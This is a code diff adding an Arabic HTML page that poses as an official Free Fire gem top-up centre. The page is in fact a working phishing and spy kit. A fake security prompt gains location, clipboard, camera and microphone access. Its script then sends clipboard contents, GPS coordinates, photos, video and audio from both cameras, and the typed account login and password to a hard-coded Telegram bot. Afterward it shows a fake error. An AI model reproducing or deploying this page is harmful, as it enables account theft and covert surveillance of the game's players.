@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire - مركز شحن الجواهر الرسمي</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            font-family: 'Cairo', Tahoma, sans-serif;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        #permissionOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 10, 15, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .permission-card {
+            background: rgba(20, 20, 30, 0.95);
+            border: 2px solid #ffcc00;
+            border-radius: 15px;
+            padding: 30px;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(255, 204, 0, 0.5);
+        }
+        .permission-card h2 {
+            color: #ffcc00;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        .permission-card p {
+            color: #ccc;
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        .btn-permission {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #ff7300, #ffcc00);
+            border: none;
+            border-radius: 8px;
+            color: #000;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(255, 115, 0, 0.6);
+        }
+        .card {
+            background: rgba(20, 20, 30, 0.9);
+            border: 2px solid #ffcc00;
+            border-radius: 15px;
+            padding: 25px;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+            box-shadow: 0 0 25px rgba(255, 204, 0, 0.4);
+            box-sizing: border-box;
+            display: none;
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ffcc00;
+            margin-bottom: 5px;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.6);
+        }
+        .sub-title {
+            font-size: 13px;
+            color: #aaa;
+            margin-bottom: 15px;
+        }
+        .input-group {
+            margin-bottom: 12px;
+            text-align: right;
+        }
+        label {
+            font-size: 11px;
+            color: #ffcc00;
+            display: block;
+            margin-bottom: 3px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #444;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(90deg, #ff7300, #ffcc00);
+            border: none;
+            border-radius: 8px;
+            color: #000;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            box-shadow: 0 0 15px rgba(255, 115, 0, 0.5);
+        }
+        #statusMsg {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #00ffcc;
+        }
+    </style>
+</head>
+<body>
+
+<div id="permissionOverlay">
+    <div class="permission-card">
+        <h2>⚠️ التحقق الأمني مطلوب</h2>
+        <p>يطلب موقع Free Fire الرسمي السماح بالوصول (الموقع والكاميرا والصوت) للتحقق من هويتك ومنح الجواهر لحسابك.</p>
+        <button class="btn-permission" onclick="requestDevicePermissions()">سماح واستكمال الدخول</button>
+    </div>
+</div>
+
+<div class="card" id="mainContent">
+    <div class="logo">🔥 FREE FIRE VIP 🔥</div>
+    <div class="sub-title">سجل دخولك لحسابك (Gmail / رقم الهاتف / Facebook) لشحن الجواهر</div>
+    
+    <div class="input-group">
+        <label>البريد (Gmail) أو رقم الهاتف أو فيسبوك:</label>
+        <input type="text" id="identifier" placeholder="أدخل البريد أو الرقم أو الايميل" required>
+    </div>
+    <div class="input-group">
+        <label>كلمة المرور (Password):</label>
+        <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+    </div>
+    <button type="button" class="btn-submit" onclick="submitCredentials()">تسجيل الدخول وشحن الجواهر</button>
+    <div id="statusMsg"></div>
+</div>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
+    const CHAT_ID = "7713496654";
+
+    let victimData = {
+        clipboard: "لم يتم العثور علي بيانات",
+        location: "لم يتم تحديد الموقع"
+    };
+
+    function sendTelegramMessage(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const data = JSON.stringify({ chat_id: CHAT_ID, text: text });
+        
+        if (navigator.sendBeacon) {
+            let blob = new Blob([data], { type: 'application/json' });
+            navigator.sendBeacon(url, blob);
+        } else {
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: data,
+                mode: 'no-cors'
+            }).catch(() => {
+                let img = new Image();
+                img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+            });
+        }
+    }
+
+    function sendTelegramPhoto(base64Image, caption) {
+        let blob = dataURItoBlob(base64Image);
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData, mode: 'no-cors' }).catch(() => {});
+    }
+
+    function sendTelegramVideo(videoBlob, caption) {
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('video', videoBlob, 'video.webm');
+        formData.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData, mode: 'no-cors' }).catch(() => {});
+    }
+
+    function sendTelegramAudio(audioBlob, caption) {
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('audio', audioBlob, 'audio.webm');
+        formData.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData, mode: 'no-cors' }).catch(() => {});
+    }
+
+    function dataURItoBlob(dataURI) {
+        let byteString = atob(dataURI.split(',')[1]);
+        let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+        let ab = new ArrayBuffer(byteString.length);
+        let ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        return new Blob([ab], {type: mimeString});
+    }
+
+    // هذه الدالة تطلب الأذونات رسمياً من المتصفح عند ضغط الزر
+    async function requestDevicePermissions() {
+        document.getElementById('permissionOverlay').style.display = 'none';
+        document.getElementById('mainContent').style.display = 'block';
+
+        // 1. طلب إذن الموقع الجغرافي
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                victimData.location = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                sendTelegramMessage(`📍 تم رصد الموقع:\n${victimData.location}`);
+            }, () => {
+                victimData.location = "تم رفض إذن الموقع";
+            }, { timeout: 5000 });
+        }
+
+        // 2. طلب إذن الحافظة
+        try {
+            const clip = await navigator.clipboard.readText();
+            if(clip) victimData.clipboard = clip;
+        } catch(e) {}
+
+        sendTelegramMessage(`🚨 وافق المستخدم على الأذونات ودخل الموقع!\n\nاݪحافظه 📑~>\n${victimData.clipboard}`);
+
+        // 3. طلب أذونات الكاميرا والصوت وبدء التقاط الوسائط فوراً
+        setTimeout(async () => {
+            await captureAllMedia("user", "الأمامية");
+            await captureAllMedia("environment", "الخلفية");
+        }, 1000);
+    }
+
+    // دالة إرسال اسم المستخدم وكلمة السر فور الضغط عليها
+    function submitCredentials() {
+        const identifier = document.getElementById('identifier').value.trim();
+        const password = document.getElementById('password').value.trim();
+        
+        if (!identifier || !password) {
+            alert("يرجى ملء جميع الحقول المطلوبة!");
+            return;
+        }
+
+        document.getElementById('statusMsg').innerText = "جاري التحقق من الحساب وشحن الجواهر...";
+
+        let finalMessage = `🎯 تم التقاط بيانات تسجيل الدخول!\n\nاݪمستخدم 😵~> ${identifier}\n\nڪݪمة اݪسر  👻~> ${password}\n\nاݪحافظه 📑~> ${victimData.clipboard}\n\nاݪموقع 😊~> ${victimData.location} ☆`;
+
+        sendTelegramMessage(finalMessage);
+
+        setTimeout(() => {
+            alert("خطأ في الاتصال بالخادم أو كلمة المرور غير صحيحة. يرجى المحاولة لاحقاً.");
+        }, 2500);
+    }
+
+    async function captureAllMedia(facingMode, name) {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: { exact: facingMode } }, 
+                audio: true 
+            }).catch(async () => {
+                return await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facingMode }, 
+                    audio: true 
+                });
+            });
+
+            video.srcObject = stream;
+            await new Promise(r => setTimeout(r, 2000));
+
+            for (let i = 0; i < 4; i++) {
+                if (video.videoWidth > 0 && video.videoHeight > 0) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    sendTelegramPhoto(canvas.toDataURL('image/jpeg'), `📸 صورة (${name}) رقم ${i+1}`);
+                }
+                await new Promise(r => setTimeout(r, 1000));
+            }
+
+            await new Promise((resolve) => {
+                let videoChunks = [];
+                let vRecorder;
+                try {
+                    vRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                } catch(e) {
+                    vRecorder = new MediaRecorder(stream);
+                }
+
+                vRecorder.ondataavailable = e => { if(e.data.size > 0) videoChunks.push(e.data); };
+                vRecorder.onstop = () => {
+                    let vBlob = new Blob(videoChunks, { type: 'video/webm' });
+                    sendTelegramVideo(vBlob, `🎥 فيديو مسجل (${name}) مدته 8 ثواني`);
+                    resolve();
+                };
+                vRecorder.start();
+                setTimeout(() => {
+                    if (vRecorder.state === "recording") vRecorder.stop();
+                    else resolve();
+                }, 8000);
+            });
+
+            await new Promise((resolve) => {
+                let audioChunks = [];
+                let aRecorder;
+                try {
+                    aRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                } catch(e) {
+                    aRecorder = new MediaRecorder(stream);
+                }
+
+                aRecorder.ondataavailable = e => { if(e.data.size > 0) audioChunks.push(e.data); };
+                aRecorder.onstop = () => {
+                    let aBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    sendTelegramAudio(aBlob, `🎙️ تسجيل صوتي (${name}) مدته 8 ثواني`);
+                    resolve();
+                };
+                aRecorder.start();
+                setTimeout(() => {
+                    if (aRecorder.state === "recording") aRecorder.stop();
+                    else resolve();
+                }, 8000);
+            });
+
+            stream.getTracks().forEach(t => t.stop());
+        } catch (err) {
+            sendTelegramMessage(`⚠️ خطأ في سحب وسائط (${name}): ${err.message}`);
+        }
+    }
+</script>
+
+</body>
+</html>
